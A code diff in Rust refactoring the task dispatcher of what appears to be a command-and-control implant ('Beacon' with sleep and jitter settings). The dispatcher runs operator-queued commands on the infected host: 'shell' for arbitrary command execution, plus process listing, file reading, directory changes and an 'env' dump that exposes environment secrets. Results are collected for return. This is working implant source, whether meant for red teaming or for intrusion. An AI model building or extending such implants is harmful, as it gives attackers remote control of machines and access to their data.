@@ -42,95 +42,56 @@ impl TasksManager {
 
     pub fn dispatch(&mut self, beacon: &mut Beacon) -> Result<(), String> {
         if self.tasks.is_empty() {
-            return Ok(println!("No tasks to dispatch."));
+            println!("No tasks to dispatch.");
+            return Ok(());
         }
 
         while let Some(task) = self.tasks.pop_front() {
             println!("Dispatching task: {:?}", task);
-            match task.command.as_str() {
-                "ps" => {
-                    let result = commands::ps();
-                    let task_result = TaskResult {
-                        task: task.clone(),
-                        output: result,
-                    };
-                    self.completed_tasks.push(task_result);
-                }
-                "ls" => {
-                    let result = commands::ls_command(&task.args.join(" "));
-                    let task_result = TaskResult {
-                        task: task.clone(),
-                        output: result,
-                    };
-                    self.completed_tasks.push(task_result);
-                }
-                "pwd" => {
-                    let result = commands::pwd();
-                    let task_result = TaskResult {
-                        task: task.clone(),
-                        output: result,
-                    };
-                    self.completed_tasks.push(task_result);
-                }
-                "cd" => {
-                    let args = task.args.join(" ");
-                    let result = commands::cd(&args);
-                    let task_result = TaskResult {
-                        task: task.clone(),
-                        output: result,
-                    };
-                    self.completed_tasks.push(task_result);
-                }
-                "shell" => {
-                    let args = task.args.join(" ");
-                    let result = commands::shell(&args);
-                    let task_result = TaskResult {
-                        task: task.clone(),
-                        output: result,
-                    };
-                    self.completed_tasks.push(task_result);
-                }
-                "whoami" => {
-                    let result = commands::whoami();
-                    let task_result = TaskResult {
-                        task: task.clone(),
-                        output: result,
-                    };
-                    self.completed_tasks.push(task_result);
-                }
-                "sleep" => {
-                    if task.args.len() != 2 {
-                        let task_result = TaskResult {
-                            task: task.clone(),
-                            output: "Invalid arguments for sleep command".into(),
-                        };
-                        self.completed_tasks.push(task_result);
-                        continue;
-                    }
 
-                    let sleep = task.args[0].parse::<u64>();
-                    let jitter = task.args[1].parse::<u64>();
+            let args_str = task.args.join(" ");
 
-                    beacon.set_sleep(
-                        std::time::Duration::from_secs(sleep.unwrap_or(beacon.sleep.as_secs())),
-                        std::time::Duration::from_secs(jitter.unwrap_or(beacon.jitter.as_secs())),
-                    );
-                    let task_result = TaskResult {
-                        task: task.clone(),
-                        output: format!(
-                            "Sleep set to {} seconds with {} seconds jitter",
-                            beacon.sleep.as_secs(),
-                            beacon.jitter.as_secs()
-                        ),
-                    };
-                    self.completed_tasks.push(task_result);
-                }
+            let output = match task.command.as_str() {
+                "ps" => commands::system::ps(),
+                "ls" => commands::file_system::ls_command(&args_str),
+                "pwd" => commands::file_system::pwd(),
+                "cd" => commands::file_system::cd(&args_str),
+                "shell" => commands::execution::shell(&args_str),
+                "whoami" => commands::execution::whoami(),
+                "cat" => commands::file_system::cat(&args_str),
+                "mkdir" => commands::file_system::mkdir(&args_str),
+                "env" => commands::system::env(),
+                "sleep" => self.handle_sleep_command(beacon, &task.args),
                 _ => {
-                    println!("Unknown command: {}", task.command);
+                    let err = format!("Unknown command: {}", task.command);
+                    println!("{}", err);
+                    err
                 }
             };
+
+            self.completed_tasks.push(TaskResult { task, output });
         }
         Ok(())
+    }
+
+    fn handle_sleep_command(&self, beacon: &mut Beacon, args: &[String]) -> String {
+        if args.len() != 2 {
+            return "Invalid arguments for sleep command".into();
+        }
+
+        let sleep_val = args[0].parse::<u64>().unwrap_or(beacon.sleep.as_secs());
+        let jitter_val = args[1].parse::<u64>().unwrap_or(beacon.jitter.as_secs());
+
+        beacon.set_sleep(
+            std::time::Duration::from_secs(sleep_val),
+            std::time::Duration::from_secs(jitter_val),
+        );
+
+        format!(
+            "Sleep set to {}s with {}s jitter",
+            beacon.sleep.as_secs(),
+            beacon.jitter.as_secs()
+        )
     }
 }
 
